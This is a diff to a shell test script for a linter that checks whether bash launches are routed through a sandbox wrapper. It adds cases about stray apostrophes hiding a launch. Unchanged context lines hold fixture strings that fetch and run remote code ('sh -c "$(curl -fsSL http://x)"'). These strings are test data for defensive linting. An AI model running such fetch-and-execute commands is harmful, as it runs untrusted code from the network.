@@ -196,6 +196,14 @@ if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'quoted parenthesis hides
 # shellcheck disable=SC2016
 printf '%s\n' "$WRAP -- bash x" "for c in \\" "    'sh -c \"\$(curl -fsSL http://x)\"' \\" "    'bash -c \"\`curl -fsSL http://x\`\"'; do :; done" > "$SHELL_FIXTURE"
 if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'single-quoted payload text accepted'; else bad 'single-quoted payload text rejected'; fi
+# An apostrophe inside double quotes or escaped does not open a single-quoted span.
+# shellcheck disable=SC2016,SC1003
+for launch in 'echo "can'\''t"; bash "$TARGET"; echo '\''done'\''' 'echo can\'\''t; bash "$TARGET"; echo '\''done'\'''; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "launch after a stray apostrophe accepted: $launch"
+    else ok "launch after a stray apostrophe rejected: $launch"; fi
+done
 if python3 -I "$LINT" "$ROOT"; then ok 'owned real harnesses routed, others warned'; else bad 'real corpus sandbox lint'; fi
 printf '%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" = 0 ]
